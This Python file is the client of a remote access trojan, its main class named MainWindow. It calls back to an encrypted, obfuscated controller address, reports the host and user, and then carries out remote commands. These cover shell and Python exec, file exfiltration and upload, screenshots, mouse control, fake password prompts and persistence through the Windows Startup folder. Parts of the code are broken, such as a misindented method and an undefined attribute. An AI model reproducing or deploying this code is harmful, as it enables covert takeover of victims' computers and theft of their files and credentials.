from socket import *
import json, subprocess, os, base64, platform, getpass, random, time, gc, sys, zipfile, ctypes
import pyautogui as pg
from cryptography.fernet import Fernet

class MainWindow:
    def __init__(self, ip, port, timeout=5):
        self.s = socket(AF_INET, SOCK_STREAM)
        self.timeout = timeout
        self.ip = ip
        self.port = port
        self.mouse = 0
        while True:
            try:
                self.s.connect((ip, port))
                break
            except:
                time.sleep(timeout)
    
    def recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.s.recv(2048).decode()
                return json.loads(json_data)
            except ValueError:
                continue
            except:
                try:
                    self.s = socket(AF_INET, SOCK_STREAM)
                    self.s.connect((self.ip, self.port))
                    self.send(platform.system() + " " + platform.release() + ":" + os.getenv("COMPUTERNAME") + ":" + getpass.getuser())
                except Exception as exc:
                    #print(exc)
                    time.sleep(1)
    def send(self, data):
        self.s.send(json.dumps(data).encode())

    def download(self, filename):
        try:
            with open(filename, "r") as f:
                file = f.read()
            self.send(base64.b64encode(file.encode()).decode())
        except Exception as e:
            try:
                with open(filename, "rb") as f:
                    file = f.read()
                self.send(base64.b64encode(file).decode())
            except Exception as e:
                self.send("error " + str(e))
    def upload(self, filename):
        self.send("123ggigigiug")
        data = self.recv()
        if data == "error":
            return False
        else:
            file = base64.b64decode(data.encode())
            try:
                with open(filename, "w") as f:
                    f.write(file)
            except:
                with open(filename, "wb") as f:
                    f.write(file)

    def change_workdir(self, path):
        try:
            os.chdir(path)
            self.send("[+] Working Directory changed to " + path)
        except FileNotFoundError:
            self.send("[-] Path Not Found")
        except NotADirectoryError:
            self.send("[-] Not a directory")
        

    def create_file(self, filename):
        try:
            with open(filename, "r") as f:
                f.read()
            self.send("[-] Error: This File Alreadly exists")
        except FileNotFoundError:
            with open(filename, "w") as f:
                f.write("")
            self.send("[+] File Created Succesfully")

    def append_file(self, filename, text):
        try:
            with open(filename, "r") as f:
                f.read()
            with open(filename, "a") as f:
                f.write(text)
            self.send("[+] Succesfully appended " + text + " to " + filename)
        except FileNotFoundError:
            self.send("[-] Error: File Not Found")

    def show_msgbox(self, int_type, text, title):
        if int_type == 0:
            pg.alert(text=text.replace("_"," ").replace("\\n", "\n"), title=title.replace("_", " "))
            self.send("[+] Done")
        elif int_type == 1:
            pg.confirm(text=text.replace("_"," ").replace("\\n", "\n"), title=title.replace("_", " "))
            self.send("[+] Done")
        elif int_type == 2:
            pg.prompt(text=text.replace("_"," ").replace("\\n", "\n"), title=title.replace("_", " "))
            self.send("[+] Done")
        elif int_type == 3:
            pg.password(text=text.replace("_"," ").replace("\\n", "\n"), title=title.replace("_", " "))
            self.send("[+] Done")
        else:
            self.send("[-] Error: incorrect type")

    def screenshot(self):
        pg.screenshot("scrnshot" + random.choice(self.chars) + ".png")
        self.send("[+] Done")
        
    def execute_cmd(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, text=True)
        except Exception as e:
            return "error: incorrect command (" + str(e) + ")"

    def show_desktop(self):
        pg.hotkey("winleft", "d")
        self.send("[+] Done")

    def random_string(self, len=5):
        temp = ""
        for i in range(len):
            temp += random.choice("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
        return temp

    def autorun(self, filename="", ):
        if filename == "":
            filename = sys.argv[0]
        user = getpass.getuser()
        batp = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + self.random_string() + ".bat"
        with open(batp, "w") as f:
            f.write("start "" \"" + filename + "\"")
        self.send("[+] Added to autorun!")

        def get_privateip(self):
        s = socket(AF_INET, SOCK_DGRAM)
        s.settimeout(0)
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP
    
    def swapmouse(self):
        try:
            if self.mouse == 0:
                ctypes.windll.user32.SwapMouseButton(1)
                self.mouse = 1
                self.send("[+] SwapMouseButton = 1")
            else:
                ctypes.windll.user32.SwapMouseButton(0)
                self.mouse = 0
                self.send("[+] SwapMouseButton = 0")
        except Exception as e:
            self.send("[-] Failed! Exception: " + str(e))

    def beep(self, dwFreq, dwDuration):
        try:
            ctypes.windll.kernel32.Beep(dwFreq, dwDuration)
            self.send("[+] Beep(%d, %d)" % (dwFreq, dwDuration))
        except Exception as e:
            self.send("[-] Failed! Exception: " + str(e))

    def run(self):
        #with open("windows.exe.vbs", "w") as f:
        #    f.write("MsgBox \"Завершить процесс windows.exe?\", 4+16,\"Windows\"")
        self.send(platform.system() + " " + platform.release() + ":" + os.getenv("COMPUTERNAME") + ":" + getpass.getuser())
        while True:    
            command = self.recv()
            if command.split(" ")[0] == "download":
                self.download(command.split(" ")[1])
            elif command.split(" ")[0] == "upload":
                self.upload(command.split(" ")[1])
            elif command == "cd":
                self.send(self.execute_cmd(command))
            elif command.split(" ")[0] == "cd":
                self.change_workdir(command.split(" ")[1])
            elif command == "uninstall":
                self.send("[*] Press Enter to exit from session")
                self.s.close()
                exit()
            elif command == "cursorpos":
                p = pg.position()
                x = p[0]
                y = p[1]
                self.send("[+] X: " + str(x) + " Y: " + str(y))
            elif command.split(" ")[0] == "cursormove":
                pg.moveTo(int(command.split(" ")[1]), int(command.split(" ")[2]))
                self.send("[+] Cursor Moved To X: " + command.split(" ")[1] + " Y: " + command.split(" ")[2])
            elif command.split(" ")[0] == "touch":
                self.create_file(command.split(" ")[1])
            elif command.split(" ")[0] == "appendfile":
                self.append_file(command.split(" ")[1], command.split(" ", 2)[2])
            elif command.split(" ")[0] == "msgbox":
                self.show_msgbox(int(command.split(" ")[1]), command.split(" ")[2], command.split(" ")[3])
            elif command.split(" ", 1)[0] == "pyexec":
                exec(command.split(" ", 1)[1])
                self.send("[+] Executed!")
            elif command.split(" ", 1)[0] == "pyexecf":
                with open(command.split(" ", 1)[1], "r") as f:
                    kod = f.read()
                exec(kod)
                self.send("[+] File executed!")
            elif command.split(" ")[0] == "beep":
                self.beep(int(command.split(" ")[1]), int(command.split(" ")[2]))
            elif command == "showdesktop":
                self.show_desktop()
            elif command == "screenshot":
                self.screenshot()
            elif command == "private_ip":
                self.send(self.get_privateip())
            elif command == "autorun":
                self.autorun()
            elif command == "swapmouse":
                self.swapmouse()
            else:
                self.send(self.execute_cmd(command))


class CustomCrypto:
    def decrypt(self, key, value):
        returnval = ""
        for symb in value:
            returnval += chr(ord(symb) - key)
        return returnval
    def encrypt(self, key, value):
        returnval = ""
        for symb in value:
            returnval += chr(ord(symb) + key)
        return returnval

class IPCrypto:
    def encrypt(self, enc_str):
        key = cipher.decrypt(custom_key, 'u\x8et}pl\x85\x8ch\x90~\\obu\x8dS\x87L_nudRq\x95\\h\x95o|u\x8dN\x95\x85pKH}^\x89\\X').encode()
        f = Fernet(key)
        return f.encrypt(enc_str.encode())
    def decrypt(self, enc_bytes):
        key = cipher.decrypt(custom_key, 'u\x8et}pl\x85\x8ch\x90~\\obu\x8dS\x87L_nudRq\x95\\h\x95o|u\x8dN\x95\x85pKH}^\x89\\X').encode()
        f = Fernet(key)
        return f.decrypt(enc_bytes).decode()


encrypted_ip = b'gAAAAABih3m9YMWqJsUBnkmXuimcR2wuoBgyZH0_KAD3ifJCk-jFEyciEA6QhvM5HKlydBMI8xyemjkVaboPf2BY_Qjd4VY0yQ==' ## 192.168.50.40
custom_key = 10 // 2 * 5 ^ 2 #27
cipher = CustomCrypto()
fernet_key = cipher.decrypt(custom_key, 'u\x8et}pl\x85\x8ch\x90~\\obu\x8dS\x87L_nudRq\x95\\h\x95o|u\x8dN\x95\x85pKH}^\x89\\X').encode()
f = Fernet(fernet_key)



crypto_obj = IPCrypto()


print("[DBG] Started MEM_Cleanup")
del fernet_key
del f
count = gc.collect()
main = MainWindow(crypto_obj.decrypt(encrypted_ip), 8080)
del custom_key
del encrypted_ip
del cipher
del CustomCrypto
del crypto_obj
del IPCrypto
count += gc.collect()
print("[DBG] [MEM_Cleanup] Deleted from MEM:", count, "objects")
print("[DBG] Started MainWindow Class")
main.run()
